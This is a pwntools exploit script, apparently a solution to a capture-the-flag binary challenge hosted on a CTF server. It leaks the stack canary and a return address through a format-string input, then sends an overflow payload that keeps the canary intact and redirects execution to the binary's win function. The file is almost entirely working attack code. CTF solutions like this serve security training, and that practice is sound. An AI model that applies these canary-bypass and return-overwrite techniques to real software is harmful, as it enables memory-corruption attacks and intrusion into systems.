#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './chall'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote('chall.nitdgplug.org', 30511)

    p = process([exe] + argv, *a, **kw)
    if args.GDB:
        gdb.attach(p)

    return p

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

def send_payload(payload):
    io.recvline()
    io.sendline(payload)
    res = io.recvline()
    return res

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

binary = ELF(exe)

# need to overwrite last byte of the called address from cd to 29
# offset 41 - return address
# canary at offset 39
io.recvuntil('dude!\n')
io.sendline("%39$p %41$p")
canary, ret_addr = io.recvuntil('spit', drop=True).split(b' ')
canary = int(canary, 0)
ret_addr = int(ret_addr, 0)
io.recvline()
log.success("Got canary: {:2x}".format(canary))
io.sendline(b'Spitfire\x00' + b'A'*255 + p64(canary) + p64(0x0) + p64(ret_addr - 0x13d7 + binary.sym.win))

io.interactive()

